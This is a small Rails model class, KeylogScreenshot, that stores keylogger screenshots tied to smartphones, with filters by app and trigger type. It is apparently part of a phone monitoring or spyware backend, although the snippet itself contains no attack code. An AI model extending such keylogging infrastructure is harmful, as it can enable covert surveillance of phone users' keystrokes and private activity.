class KeylogScreenshot < ApplicationRecord
  belongs_to :smartphone

  scope :by_app, ->(app) { where(app_package: app) }
  scope :by_trigger, ->(trigger) { where(trigger_type: trigger) }
  scope :recent, -> { order(client_timestamp: :desc) }

  def image_url
    "/files/keylog_screenshots/#{image_path}" if image_path.present?
  end
end
